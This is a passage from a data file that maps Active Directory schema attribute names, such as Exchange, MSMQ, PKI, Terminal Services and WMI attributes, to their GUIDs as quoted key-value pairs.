        "msExchUMPinPolicyMinPasswordLength" = "a42f1dd3-9e15-41b3-9455-c70c6bd28d91";
        "msExchUMPinPolicyNumberOfPreviousPasswordsDisallowed" = "c710a868-29e8-4a98-9f56-d174a62d2a37";
        "msExchUMProtectAuthenticatedVoiceMail" = "294269b1-8313-4d92-b3cc-1aab5ce941a4";
        "msExchUMProtectedVoiceMailText" = "f54e6394-a272-4eb5-a3f2-ac81155a3d07";
        "msExchUMProtectUnauthenticatedVoiceMail" = "8782bb5c-de7e-4437-a6cd-739c4fbb2498";
        "msExchUMQueryBaseDN" = "58d9d3b8-2878-49b9-9e97-819d3673957e";
        "msExchUMRecipientDialPlanBL" = "2a5b8522-d348-49d6-a449-ccad864575e4";
        "msExchUMRecipientDialPlanLink" = "fd75c1d0-0c22-4bd8-95b7-686426c38908";
        "msExchUMRecipientTemplate" = "c632ff49-d5dd-4e98-94ba-ef992b548b1f";
        "msExchUMRecordingIdleTimeout" = "4aba3af6-4a35-452b-b30a-225584012350";
        "msExchUMRedirectTarget" = "02b93bf4-23f7-4701-80c4-dfcb2826d5be";
        "msExchUMRequireProtectedPlayOnPhone" = "65fa81dd-38eb-43fa-b071-e1e9ccc1968e";
        "msExchUMResetPasswordValue" = "5d088af5-7397-43ea-9b24-d239997c353e";
        "msExchUMResetPINText" = "27d13f09-6f58-435a-8940-8c1dd934c7ee";
        "msExchUMSendVoiceMessageEnabled" = "ee4c2a9b-6f25-4351-b61f-9ad86a57333d";
        "msExchUMSendVoiceMessageScope" = "4aaf894c-70cc-4bf1-824f-3e01c6036e9c";
        "msExchUMServerDialPlanBL" = "bdd16b37-af15-48f8-b210-cdd1cca1373a";
        "msExchUMServerDialPlanLink" = "33f4087f-32ea-401b-b5e6-88668daae04b";
        "msExchUMServerStatus" = "9ac6d2f7-250c-4ded-8023-fb679c89e270";
        "msExchUMServerWritableFlags" = "5e353847-f36c-48be-a7f7-49685402503c";
        "msExchUMSiteRedirectTarget" = "ccb9c1df-50f7-4cf7-b317-04103f532811";
        "msExchUMSourceForestPolicyNames" = "15375d93-18e3-495a-9a6d-ff317f9dd56b";
        "msExchUMSpeechGrammarFilterList" = "237dfb6a-5921-4b3e-8fdb-3549f5e604c4";
        "msExchUMSpokenName" = "2cc06e9d-6f7e-426a-8825-0215de176e11";
        "msExchUMStartupMode" = "623940a0-56e8-4bf5-8fe0-27dc1f9ce6f6";
        "msExchUMTcpListeningPort" = "0a4e5c52-f0be-4172-bad3-275a6692a973";
        "msExchUMTemplateBL" = "da3a5720-293f-4499-a7f4-d9a088f9df25";
        "msExchUMTemplateLink" = "8cd81343-90ca-447b-9a0f-e57376453f55";
        "msExchUMThrottlingPolicyState" = "cbe22f1a-9f6f-46c9-9369-0c7375d54dce";
        "msExchUMTimeZone" = "c50df835-d4bd-4f62-8260-4647e29dbe18";
        "msExchUMTlsListeningPort" = "bd87c4b6-beb5-44d6-bcb7-65ea26c7bef8";
        "msExchUMTrunkAccessCode" = "bd82b92c-faaa-40d2-8f0a-f2c13ca8e927";
        "msExchUMVirtualDirectory" = "c0d365d9-5fca-456a-a0cc-4c794efdf19d";
        "msExchUMVoiceMailOriginator" = "4b894f61-bd29-4680-9dae-a26238f896db";
        "msExchUMVoiceMailPilotNumbers" = "e60110ec-966a-4a80-86de-2bd38624e5f1";
        "msExchUMVoiceMailText" = "29bfbee0-8b87-45c2-8c93-8470194eeb7e";
        "msExchUMWeekStartDay" = "f4395158-afcc-4900-8989-1a437ba72fda";
        "msExchUMWelcomeGreetingEnabled" = "6e2f83b6-ad2c-436d-a475-40fc0767c770";
        "msExchUMWelcomeGreetingFile" = "4820ef72-d2bd-40d1-be57-6fbd7480a5ff";
        "msExchUNCPassword" = "8c07dc94-b09e-11d2-aa06-00c04f8eedd8";
        "msExchUNCUsername" = "8be8de02-b09e-11d2-aa06-00c04f8eedd8";
        "msExchUnmergedAttsPt" = "a5924ad4-c597-4db1-8f9d-1799909dc166";
        "msExchUsageLocation" = "a3738710-8a70-4614-8148-f63e1ad98992";
        "msExchUseExcludedMailboxDatabases" = "d77d49f8-7946-48cd-8a1c-9f3fd303abfe";
        "msExchUseIncludedMailboxDatabases" = "7cc75747-9eef-42e4-9e43-9b2d578c3110";
        "msExchUseOAB" = "2209550c-b099-11d2-aa06-00c04f8eedd8";
        "msExchUseOABBL" = "22428d7c-b099-11d2-aa06-00c04f8eedd8";
        "msExchUserAccountControl" = "07c31f12-a3e8-4fa0-af8e-4932c75b2241";
        "msExchUserBL" = "8f53f939-becb-42d3-b487-4412adbd29ef";
        "msExchUserCulture" = "275b2f54-982d-4dcd-b0ad-e53501445efb";
        "msExchUserDisplayName" = "a3ef7e6c-3809-4925-ad0f-00c7530da5a4";
        "msExchUserLink" = "f2c1c085-8f56-457e-9add-7b23772ba6f0";
        "msExchVersion" = "1280170a-3e6d-4382-a5ea-3a528e6ff510";
        "msExchVirtualDirectory" = "28009b8e-9876-44f3-b907-a3bf06d3cc1f";
        "msExchVisibilityMask" = "22770138-b099-11d2-aa06-00c04f8eedd8";
        "msExchVoiceMailboxID" = "567d5200-2f6a-11d3-aa6c-00c04f8eedd8";
        "msExchVoiceMailPreviewPartnerAddress" = "b0e0f854-7d8c-474f-b928-26e3ed9a760e";
        "msExchVoiceMailPreviewPartnerAssignedID" = "52419e4e-728d-4171-a3dc-15f8d8d48203";
        "msExchVoiceMailPreviewPartnerMaxDeliveryDelay" = "f02a2fa9-9ff4-4802-95fc-6214aef0f89e";
        "msExchVoiceMailPreviewPartnerMaxMessageDuration" = "792e914e-366d-4f3d-8076-84650ee32af0";
        "msExchVPIMConvertInbound" = "2d0977eb-2b54-11d3-aa6b-00c04f8eedd8";
        "msExchVPIMConvertOutbound" = "2d0977f1-2b54-11d3-aa6b-00c04f8eedd8";
        "msExchWebAccessName" = "8df7c5b4-b09e-11d2-aa06-00c04f8eedd8";
        "msExchWebServicesVirtualDirectory" = "d34e9d76-5269-4ed9-b91a-2f2a4b20a5cf";
        "msExchWhenMailboxCreated" = "8155535e-9d28-4610-95b9-724d59226f1a";
        "msExchWindowsLiveAccountURL" = "b609a3eb-6132-42c2-8b46-e98f22160830";
        "msExchWindowsLiveAccountURLEnabled" = "819da0a6-e7e6-42fc-ac40-416cfe0c6627";
        "msExchWindowsLiveID" = "71337be6-4610-494a-afe0-62e1ada38707";
        "msFRS-Hub-Member" = "5643ff81-35b6-4ca9-9512-baf0bd0a2772";
        "msFRS-Topology-Pref" = "92aa27e0-5c50-402d-9ec1-ee847def9788";
        "msFVE-KeyPackage" = "1fd55ea8-88a7-47dc-8129-0daa97186a54";
        "msFVE-RecoveryGuid" = "f76909bc-e678-47a0-b0b3-f86a0044c06d";
        "msFVE-RecoveryInformation" = "ea715d30-8f53-40d0-bd1e-6109186d782c";
        "msFVE-RecoveryPassword" = "43061ac1-c8ad-4ccc-b785-2bfac20fc60a";
        "msFVE-VolumeGuid" = "85e5a5cf-dcee-4075-9cfd-ac9db6a2f245";
        "msieee80211-Data" = "0e0d0938-2658-4580-a9f6-7a0ac7b566cb";
        "msieee80211-DataType" = "6558b180-35da-4efe-beed-521f8f48cafb";
        "msieee80211-ID" = "7f73ef75-14c9-4c23-81de-dd07a06f9e8b";
        "msieee80211-Policy" = "7b9a2d92-b7eb-4382-9772-c3e0f9baaf94";
        "msiFileList" = "7bfdcb7d-4807-11d1-a9c3-0000f80367c1";
        "msIIS-FTPDir" = "8a5c99e9-2230-46eb-b8e8-e59d712eb9ee";
        "msIIS-FTPRoot" = "2a7827a4-1483-49a5-9d84-52e3812156b4";
        "msImaging-HashAlgorithm" = "8ae70db5-6406-4196-92fe-f3bb557520a7";
        "msImaging-PostScanProcess" = "1f7c257c-b8a3-4525-82f8-11ccc7bee36e";
        "msImaging-PSPIdentifier" = "51583ce9-94fa-4b12-b990-304c35b18595";
        "msImaging-PSPs" = "a0ed2ac1-970c-4777-848e-ec63a0ec44fc";
        "msImaging-PSPString" = "7b6760ae-d6ed-44a6-b6be-9de62c09ec67";
        "msImaging-ThumbprintHash" = "9cdfdbc5-0304-4569-95f6-c4f663fe5ae6";
        "msiScript" = "d9e18313-8939-11d1-aebc-0000f80367c1";
        "msiScriptName" = "96a7dd62-9118-11d1-aebc-0000f80367c1";
        "msiScriptPath" = "bf967937-0de6-11d0-a285-00aa003049e2";
        "msiScriptSize" = "96a7dd63-9118-11d1-aebc-0000f80367c1";
        "msKds-CreateTime" = "ae18119f-6390-0045-b32d-97dbc701aef7";
        "msKds-DomainID" = "96400482-cf07-e94c-90e8-f2efc4f0495e";
        "msKds-KDFAlgorithmID" = "db2c48b2-d14d-ec4e-9f58-ad579d8b440e";
        "msKds-KDFParam" = "8a800772-f4b8-154f-b41c-2e4271eff7a7";
        "msKds-PrivateKeyLength" = "615f42a1-37e7-1148-a0dd-3007e09cfc81";
        "msKds-ProvRootKey" = "aa02fd41-17e0-4f18-8687-b2239649736b";
        "msKds-ProvServerConfiguration" = "5ef243a8-2a25-45a6-8b73-08a71ae677ce";
        "msKds-PublicKeyLength" = "e338f470-39cd-4549-ab5b-f69f9e583fe0";
        "msKds-RootKeyData" = "26627c27-08a2-0a40-a1b1-8dce85b42993";
        "msKds-SecretAgreementAlgorithmID" = "1702975d-225e-cb4a-b15d-0daea8b5e990";
        "msKds-SecretAgreementParam" = "30b099d9-edfe-7549-b807-eba444da79e9";
        "msKds-UseStartTime" = "6cdc047f-f522-b74a-9a9c-d95ac8cdfda2";
        "msKds-Version" = "d5f07340-e6b0-1e4a-97be-0d3318bd9db1";
        "mSMailConnector" = "a8df74be-c5ea-11d1-bbcb-0080c76670c0";
        "msMQ-Custom-Recipient" = "876d6817-35cc-436c-acea-5ef7174dd9be";
        "msMQ-Group" = "46b27aac-aafa-4ffb-b773-e5bf621ee87b";
        "MSMQ-MulticastAddress" = "1d2f4412-f10d-4337-9b48-6e5b125cd265";
        "msMQ-Recipient-FormatName" = "3bfe6748-b544-485a-b067-1b310c4334bf";
        "MSMQ-SecuredSource" = "8bf0221b-7a06-4d63-91f0-1499941813d3";
        "mSMQAuthenticate" = "9a0dc326-c100-11d1-bbc5-0080c76670c0";
        "mSMQBasePriority" = "9a0dc323-c100-11d1-bbc5-0080c76670c0";
        "mSMQComputerType" = "9a0dc32e-c100-11d1-bbc5-0080c76670c0";
        "mSMQComputerTypeEx" = "18120de8-f4c4-4341-bd95-32eb5bcf7c80";
        "mSMQConfiguration" = "9a0dc344-c100-11d1-bbc5-0080c76670c0";
        "mSMQCost" = "9a0dc33a-c100-11d1-bbc5-0080c76670c0";
        "mSMQCSPName" = "9a0dc334-c100-11d1-bbc5-0080c76670c0";
        "mSMQDependentClientService" = "2df90d83-009f-11d2-aa4c-00c04fd7d83a";
        "mSMQDependentClientServices" = "2df90d76-009f-11d2-aa4c-00c04fd7d83a";
        "mSMQDigests" = "9a0dc33c-c100-11d1-bbc5-0080c76670c0";
        "mSMQDigestsMig" = "0f71d8e0-da3b-11d1-90a5-00c04fd91ab1";
        "mSMQDsService" = "2df90d82-009f-11d2-aa4c-00c04fd7d83a";
        "mSMQDsServices" = "2df90d78-009f-11d2-aa4c-00c04fd7d83a";
        "mSMQEncryptKey" = "9a0dc331-c100-11d1-bbc5-0080c76670c0";
        "mSMQEnterpriseSettings" = "9a0dc345-c100-11d1-bbc5-0080c76670c0";
        "mSMQForeign" = "9a0dc32f-c100-11d1-bbc5-0080c76670c0";
        "mSMQInRoutingServers" = "9a0dc32c-c100-11d1-bbc5-0080c76670c0";
        "mSMQInterval1" = "8ea825aa-3b7b-11d2-90cc-00c04fd91ab1";
        "mSMQInterval2" = "99b88f52-3b7b-11d2-90cc-00c04fd91ab1";
        "mSMQJournal" = "9a0dc321-c100-11d1-bbc5-0080c76670c0";
        "mSMQJournalQuota" = "9a0dc324-c100-11d1-bbc5-0080c76670c0";
        "mSMQLabel" = "9a0dc325-c100-11d1-bbc5-0080c76670c0";
        "mSMQLabelEx" = "4580ad25-d407-48d2-ad24-43e6e56793d7";
        "mSMQLongLived" = "9a0dc335-c100-11d1-bbc5-0080c76670c0";
        "mSMQMigrated" = "9a0dc33f-c100-11d1-bbc5-0080c76670c0";
        "mSMQMigratedUser" = "50776997-3c3d-11d2-90cc-00c04fd91ab1";
        "mSMQNameStyle" = "9a0dc333-c100-11d1-bbc5-0080c76670c0";
        "mSMQNt4Flags" = "eb38a158-d57f-11d1-90a2-00c04fd91ab1";
        "mSMQNt4Stub" = "6f914be6-d57e-11d1-90a2-00c04fd91ab1";
        "mSMQOSType" = "9a0dc330-c100-11d1-bbc5-0080c76670c0";
        "mSMQOutRoutingServers" = "9a0dc32b-c100-11d1-bbc5-0080c76670c0";
        "mSMQOwnerID" = "9a0dc328-c100-11d1-bbc5-0080c76670c0";
        "mSMQPrevSiteGates" = "2df90d75-009f-11d2-aa4c-00c04fd7d83a";
        "mSMQPrivacyLevel" = "9a0dc327-c100-11d1-bbc5-0080c76670c0";
        "mSMQQMID" = "9a0dc33e-c100-11d1-bbc5-0080c76670c0";
        "mSMQQueue" = "9a0dc343-c100-11d1-bbc5-0080c76670c0";
        "mSMQQueueJournalQuota" = "8e441266-d57f-11d1-90a2-00c04fd91ab1";
        "mSMQQueueNameExt" = "2df90d87-009f-11d2-aa4c-00c04fd7d83a";
        "mSMQQueueQuota" = "3f6b8e12-d57f-11d1-90a2-00c04fd91ab1";
        "mSMQQueueType" = "9a0dc320-c100-11d1-bbc5-0080c76670c0";
        "mSMQQuota" = "9a0dc322-c100-11d1-bbc5-0080c76670c0";
        "mSMQRoutingService" = "2df90d81-009f-11d2-aa4c-00c04fd7d83a";
        "mSMQRoutingServices" = "2df90d77-009f-11d2-aa4c-00c04fd7d83a";
        "mSMQServices" = "9a0dc33d-c100-11d1-bbc5-0080c76670c0";
        "mSMQServiceType" = "9a0dc32d-c100-11d1-bbc5-0080c76670c0";
        "mSMQSettings" = "9a0dc347-c100-11d1-bbc5-0080c76670c0";
        "mSMQSignCertificates" = "9a0dc33b-c100-11d1-bbc5-0080c76670c0";
        "mSMQSignCertificatesMig" = "3881b8ea-da3b-11d1-90a5-00c04fd91ab1";
        "mSMQSignKey" = "9a0dc332-c100-11d1-bbc5-0080c76670c0";
        "mSMQSite1" = "9a0dc337-c100-11d1-bbc5-0080c76670c0";
        "mSMQSite2" = "9a0dc338-c100-11d1-bbc5-0080c76670c0";
        "mSMQSiteForeign" = "fd129d8a-d57e-11d1-90a2-00c04fd91ab1";
        "mSMQSiteGates" = "9a0dc339-c100-11d1-bbc5-0080c76670c0";
        "mSMQSiteGatesMig" = "e2704852-3b7b-11d2-90cc-00c04fd91ab1";
        "mSMQSiteID" = "9a0dc340-c100-11d1-bbc5-0080c76670c0";
        "mSMQSiteLink" = "9a0dc346-c100-11d1-bbc5-0080c76670c0";
        "mSMQSiteName" = "ffadb4b2-de39-11d1-90a5-00c04fd91ab1";
        "mSMQSiteNameEx" = "422144fa-c17f-4649-94d6-9731ed2784ed";
        "mSMQSites" = "9a0dc32a-c100-11d1-bbc5-0080c76670c0";
        "mSMQTransactional" = "9a0dc329-c100-11d1-bbc5-0080c76670c0";
        "mSMQUserSid" = "c58aae32-56f9-11d2-90d0-00c04fd91ab1";
        "mSMQVersion" = "9a0dc336-c100-11d1-bbc5-0080c76670c0";
        "msNPAllowDialin" = "db0c9085-c1f2-11d1-bbc5-0080c76670c0";
        "msNPCalledStationID" = "db0c9089-c1f2-11d1-bbc5-0080c76670c0";
        "msNPCallingStationID" = "db0c908a-c1f2-11d1-bbc5-0080c76670c0";
        "msNPSavedCallingStationID" = "db0c908e-c1f2-11d1-bbc5-0080c76670c0";
        "msOrg-GroupSubtypeName" = "eded5844-b3c3-41c3-a9e6-8984b52b7f98";
        "msOrg-IsOrganizational" = "49b7560b-4707-4aa0-a27c-e17a09ca3f97";
        "msOrg-Leaders" = "ee5b6790-3358-41a8-93f2-134ce21f3813";
        "msOrg-LeadersBL" = "afa58eed-a698-417e-9f56-fad54252c5f4";
        "msOrg-OtherDisplayNames" = "8f905f24-a413-435a-8ed1-35385ec179f7";
        "msPKI-Cert-Template-OID" = "3164c36a-ba26-468c-8bda-c1e5cc256728";
        "msPKI-Certificate-Application-Policy" = "dbd90548-aa37-4202-9966-8c537ba5ce32";
        "msPKI-Certificate-Name-Flag" = "ea1dddc4-60ff-416e-8cc0-17cee534bce7";
        "msPKI-Certificate-Policy" = "38942346-cc5b-424b-a7d8-6ffd12029c5f";
        "msPKI-CredentialRoamingTokens" = "b7ff5a38-0818-42b0-8110-d3d154c97f24";
        "msPKI-Enrollment-Flag" = "d15ef7d8-f226-46db-ae79-b34e560bd12c";
        "msPKI-Enrollment-Servers" = "f22bd38f-a1d0-4832-8b28-0331438886a6";
        "msPKI-Enterprise-Oid" = "37cfd85c-6719-4ad8-8f9e-8678ba627563";
        "msPKI-Key-Recovery-Agent" = "26ccf238-a08e-4b86-9a82-a8c9ac7ee5cb";
        "msPKI-Minimal-Key-Size" = "e96a63f5-417f-46d3-be52-db7703c503df";
        "msPKI-OID-Attribute" = "8c9e1288-5028-4f4f-a704-76d026f246ef";
        "msPKI-OID-CPS" = "5f49940e-a79f-4a51-bb6f-3d446a54dc6b";
        "msPKI-OID-User-Notice" = "04c4da7a-e114-4e69-88de-e293f2d3b395";
        "msPKI-OIDLocalizedName" = "7d59a816-bb05-4a72-971f-5c1331f67559";
        "msPKI-Private-Key-Flag" = "bab04ac2-0435-4709-9307-28380e7c7001";
        "msPKI-PrivateKeyRecoveryAgent" = "1562a632-44b9-4a7e-a2d3-e426c96a3acc";
        "msPKI-RA-Application-Policies" = "3c91fbbf-4773-4ccd-a87b-85d53e7bcf6a";
        "msPKI-RA-Policies" = "d546ae22-0951-4d47-817e-1c9f96faad46";
        "msPKI-RA-Signature" = "fe17e04b-937d-4f7e-8e0e-9292c8d5683e";
        "msPKI-Site-Name" = "0cd8711f-0afc-4926-a4b1-09b08d3d436c";
        "msPKI-Supersede-Templates" = "9de8ae7d-7a5b-421d-b5e4-061f79dfd5d7";
        "msPKI-Template-Minor-Revision" = "13f5236c-1884-46b1-b5d0-484e38990d58";
        "msPKI-Template-Schema-Version" = "0c15e9f5-491d-4594-918f-32813a091da9";
        "msPKIAccountCredentials" = "b8dfa744-31dc-4ef1-ac7c-84baf7ef9da7";
        "msPKIDPAPIMasterKeys" = "b3f93023-9239-4f7c-b99c-6745d87adbc2";
        "msPKIRoamingTimeStamp" = "6617e4ac-a2f1-43ab-b60c-11fbd1facf05";
        "msPrint-ConnectionPolicy" = "a16f33c7-7fd6-4828-9364-435138fda08d";
        "msRADIUS-FramedInterfaceId" = "a6f24a23-d65c-4d65-a64f-35fb6873c2b9";
        "msRADIUS-FramedIpv6Prefix" = "f63ed610-d67c-494d-87be-cd1e24359a38";
        "msRADIUS-FramedIpv6Route" = "5a5aa804-3083-4863-94e5-018a79a22ec0";
        "msRADIUS-SavedFramedInterfaceId" = "a4da7289-92a3-42e5-b6b6-dad16d280ac9";
        "msRADIUS-SavedFramedIpv6Prefix" = "0965a062-b1e1-403b-b48d-5c0eb0e952cc";
        "msRADIUS-SavedFramedIpv6Route" = "9666bb5c-df9d-4d41-b437-2eec7e27c9b3";
        "msRADIUSCallbackNumber" = "db0c909c-c1f2-11d1-bbc5-0080c76670c0";
        "msRADIUSFramedIPAddress" = "db0c90a4-c1f2-11d1-bbc5-0080c76670c0";
        "msRADIUSFramedRoute" = "db0c90a9-c1f2-11d1-bbc5-0080c76670c0";
        "msRADIUSServiceType" = "db0c90b6-c1f2-11d1-bbc5-0080c76670c0";
        "msRASSavedCallbackNumber" = "db0c90c5-c1f2-11d1-bbc5-0080c76670c0";
        "msRASSavedFramedIPAddress" = "db0c90c6-c1f2-11d1-bbc5-0080c76670c0";
        "msRASSavedFramedRoute" = "db0c90c7-c1f2-11d1-bbc5-0080c76670c0";
        "msRRASAttribute" = "f39b98ad-938d-11d1-aebd-0000f80367c1";
        "msRRASVendorAttributeEntry" = "f39b98ac-938d-11d1-aebd-0000f80367c1";
        "msSFU30Aliases" = "20ebf171-c69a-4c31-b29d-dcb837d8912d";
        "msSFU30CryptMethod" = "4503d2a3-3d70-41b8-b077-dff123c15865";
        "msSFU30DomainInfo" = "36297dce-656b-4423-ab65-dabb2770819e";
        "msSFU30Domains" = "93095ed3-6f30-4bdd-b734-65d569f5f7c9";
        "msSFU30FieldSeparator" = "a2e11a42-e781-4ca1-a7fa-ec307f62b6a1";
        "msSFU30IntraFieldSeparator" = "95b2aef0-27e4-4cb9-880a-a2d9a9ea23b8";
        "msSFU30IsValidContainer" = "0dea42f5-278d-4157-b4a7-49b59664915b";
        "msSFU30KeyAttributes" = "32ecd698-ce9e-4894-a134-7ad76b082e83";
        "msSFU30KeyValues" = "37830235-e5e9-46f2-922b-d8d44f03e7ae";
        "msSFU30MailAliases" = "d6710785-86ff-44b7-85b5-f1f8689522ce";
        "msSFU30MapFilter" = "b7b16e01-024f-4e23-ad0d-71f1a406b684";
        "msSFU30MasterServerName" = "4cc908a2-9e18-410e-8459-f17cc422020a";
        "msSFU30MaxGidNumber" = "04ee6aa6-f83b-469a-bf5a-3c00d3634669";
        "msSFU30MaxUidNumber" = "ec998437-d944-4a28-8500-217588adfc75";
        "msSFU30Name" = "16c5d1d3-35c2-4061-a870-a5cefda804f0";
        "msSFU30NetgroupHostAtDomain" = "97d2bf65-0466-4852-a25a-ec20f57ee36c";
        "msSFU30NetgroupUserAtDomain" = "a9e84eed-e630-4b67-b4b3-cad2a82d345e";
        "msSFU30NetId" = "e263192c-2a02-48df-9792-94f2328781a0";
        "msSFU30NetworkUser" = "e15334a3-0bf0-4427-b672-11f5d84acc92";
        "msSFU30NisDomain" = "9ee3b2e3-c7f3-45f8-8c9f-1382be4984d2";
        "msSFU30NISMapConfig" = "faf733d0-f8eb-4dcf-8d75-f1753af6a50b";
        "msSFU30NSMAPFieldPosition" = "585c9d5e-f599-4f07-9cf9-4373af4b89d3";
        "msSFU30OrderNumber" = "02625f05-d1ee-4f9f-b366-55266becb95c";
        "msSFU30PosixMember" = "c875d82d-2848-4cec-bb50-3c5486d09d57";
        "msSFU30PosixMemberOf" = "7bd76b92-3244-438a-ada6-24f5ea34381e";
        "msSFU30ResultAttributes" = "e167b0b6-4045-4433-ac35-53f972d45cba";
        "msSFU30SearchAttributes" = "ef9a2df0-2e57-48c8-8950-0cc674004733";
        "msSFU30SearchContainer" = "27eebfa2-fbeb-4f8e-aad6-c50247994291";
        "msSFU30YpServers" = "084a944b-e150-4bfe-9345-40e1aedaebba";
        "msSPP-ActivationObject" = "51a0e68c-0dc5-43ca-935d-c1c911bf2ee5";
        "msSPP-ActivationObjectsContainer" = "b72f862b-bb25-4d5d-aa51-62c59bdf90ae";
        "msSPP-ConfigLicense" = "0353c4b5-d199-40b0-b3c5-deb32fd9ec06";
        "msSPP-ConfirmationId" = "6e8797c4-acda-4a49-8740-b0bd05a9b831";
        "msSPP-CSVLKPartialProductKey" = "a601b091-8652-453a-b386-87ad239b7c08";
        "msSPP-CSVLKPid" = "b47f510d-6b50-47e1-b556-772c79e4ffc4";
        "msSPP-CSVLKSkuId" = "9684f739-7b78-476d-8d74-31ad7692eef4";
        "msSPP-InstallationId" = "69bfb114-407b-4739-a213-c663802b3e37";
        "msSPP-IssuanceLicense" = "1075b3a1-bbaf-49d2-ae8d-c4f25c823303";
        "msSPP-KMSIds" = "9b663eda-3542-46d6-9df0-314025af2bac";
        "msSPP-OnlineLicense" = "098f368e-4812-48cd-afb7-a136b96807ed";
        "msSPP-PhoneLicense" = "67e4d912-f362-4052-8c79-42f45ba7b221";
        "msTAPI-ConferenceBlob" = "4cc4601e-7201-4141-abc8-3e529ae88863";
        "msTAPI-IpAddress" = "efd7d7f7-178e-4767-87fa-f8a16b840544";
        "msTAPI-ProtocolId" = "89c1ebcf-7a5f-41fd-99ca-c900b32299ab";
        "msTAPI-RtConference" = "ca7b9735-4b2a-4e49-89c3-99025334dc94";
        "msTAPI-RtPerson" = "53ea1cb5-b704-4df9-818f-5cb4ec86cac1";
        "msTAPI-uid" = "70a4e7ea-b3b9-4643-8918-e6dd2471bfd4";
        "msTPM-InformationObject" = "85045b6a-47a6-4243-a7cc-6890701f662c";
        "msTPM-InformationObjectsContainer" = "e027a8bd-6456-45de-90a3-38593877ee74";
        "msTPM-OwnerInformation" = "aa4e1a6d-550d-4e05-8c35-4afcb917a9fe";
        "msTPM-OwnerInformationTemp" = "c894809d-b513-4ff8-8811-f4f43f5ac7bc";
        "msTPM-SrkPubThumbprint" = "19d706eb-4d76-44a2-85d6-1c342be3be37";
        "msTPM-TpmInformationForComputer" = "ea1b7b93-5e48-46d5-bc6c-4df4fda78a35";
        "msTPM-TpmInformationForComputerBL" = "14fa84c9-8ecd-4348-bc91-6d3ced472ab7";
        "msTSAllowLogon" = "3a0cd464-bc54-40e7-93ae-a646a6ecc4b4";
        "msTSBrokenConnectionAction" = "1cf41bba-5604-463e-94d6-1a1287b72ca3";
        "msTSConnectClientDrives" = "23572aaf-29dd-44ea-b0fa-7e8438b9a4a3";
        "msTSConnectPrinterDrives" = "8ce6a937-871b-4c92-b285-d99d4036681c";
        "msTSDefaultToMainPrinter" = "c0ffe2bd-cacf-4dc7-88d5-61e9e95766f6";
        "msTSEndpointData" = "40e1c407-4344-40f3-ab43-3625a34a63a2";
        "msTSEndpointPlugin" = "3c08b569-801f-4158-b17b-e363d6ae696a";
        "msTSEndpointType" = "377ade80-e2d8-46c5-9bcd-6d9dec93b35e";
        "msTSExpireDate" = "70004ef5-25c3-446a-97c8-996ae8566776";
        "msTSExpireDate2" = "54dfcf71-bc3f-4f0b-9d5a-4b2476bb8925";
        "msTSExpireDate3" = "41bc7f04-be72-4930-bd10-1f3439412387";
        "msTSExpireDate4" = "5e11dc43-204a-4faf-a008-6863621c6f5f";
        "msTSHomeDirectory" = "5d3510f0-c4e7-4122-b91f-a20add90e246";
        "msTSHomeDrive" = "5f0a24d9-dffa-4cd9-acbf-a0680c03731e";
        "msTSInitialProgram" = "9201ac6f-1d69-4dfb-802e-d95510109599";
        "msTSLicenseVersion" = "0ae94a89-372f-4df2-ae8a-c64a2bc47278";
        "msTSLicenseVersion2" = "4b0df103-8d97-45d9-ad69-85c3080ba4e7";
        "msTSLicenseVersion3" = "f8ba8f81-4cab-4973-a3c8-3a6da62a5e31";
        "msTSLicenseVersion4" = "70ca5d97-2304-490a-8a27-52678c8d2095";
        "msTSLSProperty01" = "87e53590-971d-4a52-955b-4794d15a84ae";
        "msTSLSProperty02" = "47c77bb0-316e-4e2f-97f1-0d4c48fca9dd";
        "msTSManagingLS" = "f3bcc547-85b0-432c-9ac0-304506bf2c83";
        "msTSManagingLS2" = "349f0757-51bd-4fc8-9d66-3eceea8a25be";
        "msTSManagingLS3" = "fad5dcc1-2130-4c87-a118-75322cd67050";
        "msTSManagingLS4" = "f7a3b6a0-2107-4140-b306-75cb521731e5";
        "msTSMaxConnectionTime" = "1d960ee2-6464-4e95-a781-e3b5cd5f9588";
        "msTSMaxDisconnectionTime" = "326f7089-53d8-4784-b814-46d8535110d2";
        "msTSMaxIdleTime" = "ff739e9c-6bb7-460e-b221-e250f3de0f95";
        "msTSPrimaryDesktop" = "29259694-09e4-4237-9f72-9306ebe63ab2";
        "msTSPrimaryDesktopBL" = "9daadc18-40d1-4ed1-a2bf-6b9bf47d3daa";
        "msTSProfilePath" = "e65c30db-316c-4060-a3a0-387b083f09cd";
        "msTSProperty01" = "faaea977-9655-49d7-853d-f27bb7aaca0f";
        "msTSProperty02" = "3586f6ac-51b7-4978-ab42-f936463198e7";
        "msTSReconnectionAction" = "366ed7ca-3e18-4c7f-abae-351a01e4b4f7";
        "msTSRemoteControl" = "15177226-8642-468b-8c48-03ddfd004982";
        "msTSSecondaryDesktopBL" = "34b107af-a00a-455a-b139-dd1a1b12d8af";
        "msTSSecondaryDesktops" = "f63aa29a-bb31-48e1-bfab-0a6c5a1d39c2";
        "msTSWorkDirectory" = "a744f666-3d3c-4cc8-834b-9d4f6f687b8b";
        "msWMI-Author" = "6366c0c1-6972-4e66-b3a5-1d52ad0c0547";
        "msWMI-ChangeDate" = "f9cdf7a0-ec44-4937-a79b-cd91522b3aa8";
        "msWMI-Class" = "90c1925f-4a24-4b07-b202-be32eb3c8b74";
        "msWMI-ClassDefinition" = "2b9c0ebc-c272-45cb-99d2-4d0e691632e0";
        "msWMI-CreationDate" = "748b0a2e-3351-4b3f-b171-2f17414ea779";
        "msWMI-Genus" = "50c8673a-8f56-4614-9308-9e1340fb9af3";
        "msWMI-ID" = "9339a803-94b8-47f7-9123-a853b9ff7e45";
        "msWMI-Int8Default" = "f4d8085a-8c5b-4785-959b-dc585566e445";
        "msWMI-Int8Max" = "e3d8b547-003d-4946-a32b-dc7cedc96b74";
        "msWMI-Int8Min" = "ed1489d1-54cc-4066-b368-a00daa2664f1";
        "msWMI-Int8ValidValues" = "103519a9-c002-441b-981a-b0b3e012c803";
        "msWMI-IntDefault" = "1b0c07f8-76dd-4060-a1e1-70084619dc90";
        "msWMI-intFlags1" = "18e006b9-6445-48e3-9dcf-b5ecfbc4df8e";
        "msWMI-intFlags2" = "075a42c9-c55a-45b1-ac93-eb086b31f610";
        "msWMI-intFlags3" = "f29fa736-de09-4be4-b23a-e734c124bacc";
        "msWMI-intFlags4" = "bd74a7ac-c493-4c9c-bdfa-5c7b119ca6b2";
        "msWMI-IntMax" = "fb920c2c-f294-4426-8ac1-d24b42aa2bce";
        "msWMI-IntMin" = "68c2e3ba-9837-4c70-98e0-f0c33695d023";
        "msWMI-IntRangeParam" = "50ca5d7d-5c8b-4ef3-b9df-5b66d491e526";
